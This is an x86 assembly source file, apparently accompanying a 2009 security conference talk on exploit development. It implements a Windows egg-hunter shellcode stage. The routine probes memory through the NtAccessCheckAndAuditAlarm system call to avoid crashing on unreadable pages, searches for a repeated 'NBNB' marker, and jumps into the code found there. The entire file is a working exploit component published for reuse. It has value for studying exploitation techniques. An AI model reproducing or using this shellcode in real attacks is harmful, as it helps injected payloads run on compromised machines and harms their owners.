;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Talk:        The Departed - Exploit Next Generation (The Philosophy)
; Author:      Nelson Brito <nbrito *NoSPAM* sekure.org>
; Conference:  Hackers to Hackers Conference Sixth Edition (November 2009)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Copyright (c) 2009 Nelson Brito. All rights reserved worldwide.
;
; This program is free software: you can redistribute it and/or modify it
; under  the terms of the GNU General Public License  as published by the
; Free Software Foundation,  either version 3 of the License, or (at your
; option) any later version.
;
; This program  is  distributed in  the hope that  it will be useful, but
; WITHOUT  ANY  WARRANTY;   without   even  the   implied   warranty   of
; MERCHANTABILITY  or  FITNESS  FOR  A  PARTICULAR  PURPOSE.  See the GNU
; General Public License for more details.
;
; You  should have  received a copy of the  GNU  General  Public  License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
IFNDEF	NTACCESSCHECKANDAUDITALARM_HEAP_ASM__
	NTACCESSCHECKANDAUDITALARM_HEAP_ASM__	equ	<1>
.686

.MODEL FLAT, STDCALL
OPTION  CASEMAP:NONE;, PROLOGUE:NONE, EPILOGUE:NONE

.CODE
NtAccessCheckAndAuditAlarm_heap PROC
		start:
			xor		edx, edx
		inc_page:
			and		dx, 0FFFFF000h
		inc_byte:
			dec		edx
		setup_syscall:
			push		edx
			push		+02h
			pop		eax
			int		2Eh
			cmp		al, 05h
			pop		edx
			je		inc_page
		setup_egg:
			mov		eax, "NBNB"
		check_egg:
			mov		edi, edx
			scasd
			jnz		inc_byte
			scasd
			jnz		inc_byte
		egg_found:
			jmp		edi
NtAccessCheckAndAuditAlarm_heap ENDP
ELSE
	echo Sorry! Duplicate assembly component file NtAccessCheckAndAuditAlarm_heap.asm!
ENDIF

END
